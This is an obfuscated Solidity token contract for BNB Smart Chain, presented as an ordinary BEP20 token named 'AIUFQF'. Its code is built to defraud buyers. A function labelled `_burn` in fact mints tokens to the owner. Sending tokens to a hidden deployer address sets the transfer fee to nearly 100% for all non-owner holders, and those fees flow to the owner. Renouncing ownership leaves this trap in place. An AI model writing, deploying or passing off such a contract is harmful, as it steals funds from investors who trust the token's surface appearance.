/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.4;
contract MRLUWGa {
uint8 public constant decimals = 18;
uint256 private  hfiQGc = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant opyOxQ = 99999;
uint256 private  sHvATo = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  dyfHqG = 1000000000000000000;
address private  ZVkJck = address(0);
address private  hExiUe = address(0);
string public  name = "AIUFQF";
address private  sgstfB = address(0);
uint256 private  xIjvJU = 1000000000000000;
uint256 private  XQnhBB = 10000000000;
address private  KQYjvB = address(0);
address private  flHbjb = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  WvLTSj = 1000000000000000000000;
address private  tzGbee = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
address private  bwXyFi = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  kEhNvB = address(0);
string public  symbol = "AIUFQF";
event Transfer(address indexed from, address indexed to, uint256 value);
address private  SrtbrI = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  YidhaP = 100000000;

function _getsHvATo() private returns (uint256) {
return sHvATo;
}





function _getkEhNvB() private returns (address) {
return kEhNvB;
}





function _getxIjvJU() private returns (uint256) {
return xIjvJU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _gethfiQGc() private returns (uint256) {
return hfiQGc;
}

function _getXQnhBB() private returns (uint256) {
return XQnhBB;
}



function _getbwXyFi() private returns (address) {
return bwXyFi;
}



function _gethExiUe() private returns (address) {
return hExiUe;
}

function _getSrtbrI() private returns (address) {
return SrtbrI;
}





function _getsgstfB() private returns (address) {
return sgstfB;
}


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _gettzGbee() private returns (address) {
return tzGbee;
}

constructor () public {
ZVkJck = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "twpPCAn 0");
require(spender != address(0), "fwpPCAn 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getYidhaP() private returns (uint256) {
return YidhaP;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "wpPCAn");
require(to != address(0), "wpPCAn");
require(amount <= balanceOf[from], "wpPCAn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* opyOxQ/dyfHqG ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZVkJck){
dyfHqG = opyOxQ+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getflHbjb() private returns (address) {
return flHbjb;
}


function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMode: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMode: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMode: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
		function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMode: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMode: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}